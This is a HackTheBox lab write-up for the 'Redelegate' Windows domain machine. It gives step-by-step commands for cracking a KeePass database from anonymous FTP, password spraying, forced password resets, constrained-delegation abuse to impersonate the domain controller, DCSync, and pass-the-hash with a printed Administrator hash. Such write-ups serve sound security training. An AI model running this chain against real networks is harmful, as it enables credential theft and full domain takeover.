---
title: "HTB - Redelegate (Hard | Windows | Active Directory)"
date: 2026-09-18 12:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, kdbx, keepass2john, ftp, john, mssql, nxc, ldap, bloodhound, bloodyad, forcechangepassword, evil-winrm, seenabledelegationprivilege, keepass, gettgt, msds-allowedtodelegateto, getst, dcsync-attack, wmiexec, constrained-delegation]
description: "Crack a KeePass DB from FTP, spray creds via MSSQL, then ForceChangePassword & SeEnableDelegationPrivilege constrained delegation to DCSync"
image:
  path: /assets/img/redelegate.png
---

## **Recon**

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-18 15:26:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.234.50:1433: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|_  Product_Version: 10.0.20348
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49932/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
52973/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52974/tcp open  msrpc         Microsoft Windows RPC
52975/tcp open  msrpc         Microsoft Windows RPC
52980/tcp open  msrpc         Microsoft Windows RPC
52993/tcp open  msrpc         Microsoft Windows RPC
61135/tcp open  msrpc         Microsoft Windows RPC
65175/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-18T15:27:11
|_  start_date: N/A
```

### Service Discovery Analysis

The Nmap scan reveals multiple critical services running on the target machine:

- **FTP (Port 21):** Microsoft ftpd with **anonymous login enabled** — three files immediately visible: `CyberAudit.txt`, `Shared.kdbx`, `TrainingAgenda.txt`
- **DNS (Port 53):** Simple DNS Plus
- **HTTP (Port 80):** Microsoft IIS 10.0
- **Kerberos (Port 88):** Confirms Active Directory environment
- **SMB (Port 139, 445):** Microsoft Windows file sharing with message signing required
- **LDAP (Port 389, 636, 3268, 3269):** Active Directory LDAP services
- **MSSQL (Port 1433, 49932):** Microsoft SQL Server 2019 RTM — a significant attack vector
- **RDP (Port 3389):** Remote Desktop Protocol
- **WinRM (Port 5985):** Windows Remote Management

**Domain:** redelegate.vl **Hostname:** DC / dc.redelegate.vl **OS:** Windows Server 2022 (Build 10.0.20348)

Two things immediately stand out: **anonymous FTP access** exposing a `Shared.kdbx` KeePass database file, and **MSSQL Server 2019** as a potential RCE vector. The KeePass database is the highest priority target — it likely contains credentials for multiple accounts.

---

## **User**

### FTP Anonymous Access - File Retrieval

Connecting to the FTP server anonymously and downloading all three files. The `binary` command is used before downloading to ensure files are transferred in binary mode, preventing data corruption on non-text files like the `.kdbx` database:

![](/assets/img/redelegate/Pasted_image_20260918104025.png)

The three files are downloaded: `Shared.kdbx`, `CyberAudit.txt`, and `TrainingAgenda.txt`.

#### TrainingAgenda.txt Analysis

Reading `TrainingAgenda.txt` reveals an employee cyber awareness training agenda:

```text
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one

Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?

Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 

Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them
```

The session titled **"Weak Passwords - Why 'SeasonYear!' is not a good password"** is a massive hint. The document is dated **October 2024**, and in the United States, October falls in **Fall/Autumn**. Following the `SeasonYear!` pattern: `Fall2024!`

If this deduction hadn't been possible, we could generate a complete wordlist combining all seasons and years:

```python
seasons = ["Summer", "Spring", "Winter", "Autumn", "Fall"]
years = range(2000, 2030)

with open("wordlist.txt", "w") as f:
    for year in years:
        for season in seasons:
            f.write(f"{season}{year}!\n")

print("Wordlist generated: wordlist.txt")
```

### Overview - KeePass (.kdbx)

**What is KeePass?** KeePass is an open-source password manager that stores credentials in an encrypted `.kdbx` database file. The database is protected by a master password, and optionally by a key file. It is widely used in corporate environments to store service account credentials, shared passwords, and secrets.

**Why is it dangerous here?** A `.kdbx` file found on an anonymously accessible FTP server suggests poor security practices. Even though the database is encrypted, if the master password is weak it can be cracked offline using `keepass2john` and John the Ripper.

### Cracking the KeePass Database

`keepass2john` extracts the password hash from the KeePass database into a format John the Ripper can crack. We then use our generated season-year wordlist to crack it:

```bash
## 1. Generate the wordlist
python py.py

## 2. Convert KeePass database to crackable hash
keepass2john shared.kdbx > kp.hash

## 3. Crack the hash with the custom wordlist
john kp.hash --wordlist=wordlist.txt
```

![](/assets/img/redelegate/Pasted_image_20260918123302.png)

**KeePass Master Password:** `Fall2024!`

### Extracting KeePass Credentials

Open the KeePass database using KeePassXC with the cracked password to view all stored credentials:

![](/assets/img/redelegate/Pasted_image_20260918123635.png)

Multiple sets of credentials are extracted and saved for later use, including MSSQL credentials for the `SQLGuest` account.

### MSSQL Enumeration and Domain User Discovery

Testing the extracted MSSQL credentials. The `--local-auth` flag specifies local SQL Server authentication rather than Windows domain authentication:

```bash
nxc mssql <target> -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth
```

![](/assets/img/redelegate/Pasted_image_20260918124641.png)

The SQLGuest login works. Although this is a low-privilege guest account, we can leverage it for RID brute-forcing to enumerate domain users. RID brute-forcing queries the system for Security Identifiers (SIDs) mapped to usernames, allowing us to build a list of valid domain accounts even without SMB access:

```bash
nxc mssql <target> -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth --rid-brute
```

![](/assets/img/redelegate/Pasted_image_20260918125635.png)

All discovered usernames are saved to `users.txt` and all extracted KeePass passwords to `pass.txt`.

### Password Spraying

Using netexec to spray all discovered credentials against SMB to find valid domain account matches. This tests every username against every password in the lists:

```bash
nxc smb <target> -u users.txt -p pass.txt
```

![](/assets/img/redelegate/Pasted_image_20260918130202.png)

**Valid credentials discovered:** `Marie.Curie:Fall2024!`

### MAQ Enumeration and BloodHound Collection

Checking if Marie.Curie can add machine accounts to the domain (MachineAccountQuota). The `-M maq` module queries the `ms-DS-MachineAccountQuota` attribute via LDAP:

```bash
nxc ldap <target> -u 'Marie.Curie' -p 'Fall2024!' -M maq
```

![](/assets/img/redelegate/Pasted_image_20260918130536.png)

Collecting Active Directory data with BloodHound. The `--disable-autogc` flag disables automatic garbage collection to preserve all collected objects for analysis:

```bash
bloodhound-python -u 'Marie.Curie' -p 'Fall2024!' -d redelegate.vl -dc dc.redelegate.vl --zip -c All -ns <target> --disable-autogc
```

BloodHound analysis reveals that Marie.Curie is a member of the **HelpDesk** group, which has **ForceChangePassword** privilege over the user **Helen.Frost**:

![](/assets/img/redelegate/Pasted_image_20260918131129.png)

### ForceChangePassword Exploitation

Using BloodyAD to forcefully change Helen.Frost's password via the ForceChangePassword privilege inherited from the HelpDesk group membership:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD -H <target> -d "redelegate.vl" -u "marie.curie" -p 'Fall2024!' set password "helen.frost" "NewPassword@@@123"

[+] Password changed successfully!
```

Connecting via WinRM with Helen.Frost's new credentials:

```bash
evil-winrm -i redelegate.vl -u 'helen.frost' -p 'NewPassword@@@123'
```

![](/assets/img/redelegate/Pasted_image_20260918132532.png)

A shell is established as Helen.Frost. The user flag can now be retrieved.

---

## **Root**

### Privilege and Group Enumeration

Checking Helen.Frost's privileges and group memberships:

![](/assets/img/redelegate/Pasted_image_20260918132619.png)

![](/assets/img/redelegate/Pasted_image_20260918132710.png)

Two critical findings:

- Helen.Frost has **SeEnableDelegationPrivilege** — a dangerous privilege that allows configuring Kerberos delegation settings on domain objects
- The **IT group** (of which Helen.Frost is a member) has **GenericAll** over the **FS01$** machine account

### Overview - Constrained Delegation (S4U2self + S4U2proxy)

**What is Kerberos Delegation?** Delegation allows a service to impersonate a user when accessing another service on their behalf. There are three types: Unconstrained, Constrained, and Resource-Based Constrained Delegation.

**What is S4U2self?** Service for User to Self — if a service account has `TRUSTED_TO_AUTH_FOR_DELEGATION` (T2A4D) set in its `userAccountControl`, it can request a Kerberos Service Ticket (TGS) for itself on behalf of ANY domain user, without needing that user's password or ticket.

**What is S4U2proxy?** Service for User to Proxy — once a service account has a TGS via S4U2self, it can use S4U2proxy to obtain a ticket to a specific service defined in `msDS-AllowedToDelegateTo`, impersonating that user against that service.

**The attack path here:** Since MAQ showed we cannot add machine accounts or DNS records, unconstrained delegation is off the table (it requires DNS resolution for coercion). However, with:

- **GenericAll over FS01$** → we can change FS01$'s password and modify its attributes
- **SeEnableDelegationPrivilege** → we can set `TRUSTED_TO_AUTH_FOR_DELEGATION` on FS01$

We configure FS01$ to perform S4U2self + S4U2proxy against the DC's LDAP service, impersonating the DC machine account, which gives us DCSync capability.

### Constrained Delegation Attack

#### Step 1: Request TGT for Helen.Frost

Request a Kerberos Ticket Granting Ticket for Helen.Frost to use for subsequent Kerberos-based operations:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
impacket-getTGT redelegate.vl/Helen.Frost:'NewPassword@@@123'

[*] Saving ticket in Helen.Frost.ccache

export KRB5CCNAME=Helen.Frost.ccache
```

#### Step 2: Change FS01$ Password

Using GenericAll over FS01$, change its password to a known value so we can authenticate as it later:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" set password "FS01$" 'NewPa$$word1!'

[+] Password changed successfully!
```

#### Step 3: Enable TRUSTED_TO_AUTH_FOR_DELEGATION

Set the `TRUSTED_TO_AUTH_FOR_DELEGATION` (T2A4D) flag on FS01$'s `userAccountControl`. This enables the S4U2self extension, allowing FS01$ to request service tickets on behalf of any user without their credentials:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION

[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

#### Step 4: Configure Allowed Delegation Target

Set `msDS-AllowedToDelegateTo` on FS01$ pointing to `ldap/dc.redelegate.vl`. This enables S4U2proxy — FS01$ can now obtain a ticket to the DC's LDAP service on behalf of any user, including the DC machine account itself:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" set object FS01$ msDS-AllowedToDelegateTo -v 'ldap/dc.redelegate.vl'

[+] FS01$'s msDS-AllowedToDelegateTo has been updated
```

#### Step 5: Request Service Ticket Impersonating the DC

Use `impacket-getST` to perform the full S4U2self + S4U2proxy chain as FS01$, impersonating the DC machine account (`dc`) against the LDAP service. The `-impersonate dc` flag triggers S4U2self to get a TGS for the DC account, then S4U2proxy to obtain a ticket to `ldap/dc.redelegate.vl`:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-getST redelegate.vl/fs01\$:'NewPa$$word1!' -spn ldap/dc.redelegate.vl -impersonate dc

[*] Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

#### Step 6: DCSync Attack

Export the impersonation ticket and use it to perform a DCSync attack via LDAP as the DC machine account. DCSync replicates all domain credentials from the DC as if we were another domain controller:

```bash
export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
secretsdump.py -k -no-pass dc.redelegate.vl
```

![](/assets/img/redelegate/Pasted_image_20260918134602.png)

**Administrator NT Hash:** `ec17f7a2a4d96e177bfd101b94ffc0a7`

#### Step 7: Authenticate as Administrator

Use `wmiexec.py` with the extracted Administrator hash to establish an interactive shell. WMI exec uses the Windows Management Instrumentation service to execute commands remotely, an alternative to PsExec that creates less noise:

```bash
wmiexec.py redelegate.vl/administrator@dc.redelegate.vl -hashes :ec17f7a2a4d96e177bfd101b94ffc0a7
```

![](/assets/img/redelegate/Pasted_image_20260918134737.png)

Full domain administrator access is achieved. The root flag can now be retrieved.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified anonymous FTP access exposing a KeePass database, MSSQL Server 2019, and standard Active Directory services
2. **FTP Enumeration:** Downloaded three files from the anonymous FTP server including `Shared.kdbx` and `TrainingAgenda.txt`
3. **Password Pattern Discovery:** Identified `SeasonYear!` password pattern from training document dated October 2024 — deduced `Fall2024!` as the KeePass master password
4. **KeePass Cracking:** Used keepass2john to extract the hash and cracked it with a custom season-year wordlist
5. **MSSQL Enumeration:** Authenticated as SQLGuest via MSSQL and used RID brute-forcing to enumerate domain users
6. **Password Spraying:** Sprayed extracted KeePass credentials against SMB and identified Marie.Curie:Fall2024!
7. **BloodHound Analysis:** Collected domain data and identified HelpDesk group's ForceChangePassword over Helen.Frost
8. **ForceChangePassword:** Changed Helen.Frost's password and established WinRM session; retrieved user flag
9. **Privilege Discovery:** Identified SeEnableDelegationPrivilege and GenericAll over FS01$ via IT group membership
10. **Constrained Delegation Setup:** Changed FS01$ password, enabled TRUSTED_TO_AUTH_FOR_DELEGATION, and configured msDS-AllowedToDelegateTo pointing to LDAP on DC
11. **S4U2self + S4U2proxy Attack:** Used impacket-getST to impersonate the DC machine account against the LDAP service
12. **DCSync Attack:** Used the impersonation ticket to dump all domain hashes via LDAP
13. **Full Compromise:** Authenticated as Administrator via pass-the-hash with wmiexec and retrieved root flag